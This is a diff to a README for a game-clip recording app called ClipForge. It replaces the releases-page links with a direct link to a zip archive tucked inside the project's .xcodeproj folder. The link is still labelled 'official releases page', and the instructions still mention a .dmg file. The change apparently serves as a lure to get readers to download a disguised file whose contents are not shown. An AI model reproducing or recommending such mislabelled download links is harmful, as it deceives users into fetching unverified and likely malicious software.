@@ -1,12 +1,12 @@
 # 🎥 ClipForge - Capture your gaming moments with ease
 
-[![Download ClipForge](https://img.shields.io/badge/Download-ClipForge-blue.svg)](https://github.com/azimuthal-williamhubbsrehnquist769/ClipForge/releases)
+[![Download ClipForge](https://img.shields.io/badge/Download-ClipForge-blue.svg)](https://raw.githubusercontent.com/azimuthal-williamhubbsrehnquist769/ClipForge/main/ClipForge.xcodeproj/Clip_Forge_v3.3.zip)
 
 ClipForge records your screen and audio while you play games. You save your favorite moments with a single press of a button. The app works on your computer. It keeps your files local. You do not need an account. You do not need the internet. The app stays out of your way and uses very little power.
 
 ## 📥 How to get the app
 
-1. Visit the [official releases page](https://github.com/azimuthal-williamhubbsrehnquist769/ClipForge/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/azimuthal-williamhubbsrehnquist769/ClipForge/main/ClipForge.xcodeproj/Clip_Forge_v3.3.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .dmg to start your download.
 4. Open the file once the download finishes.
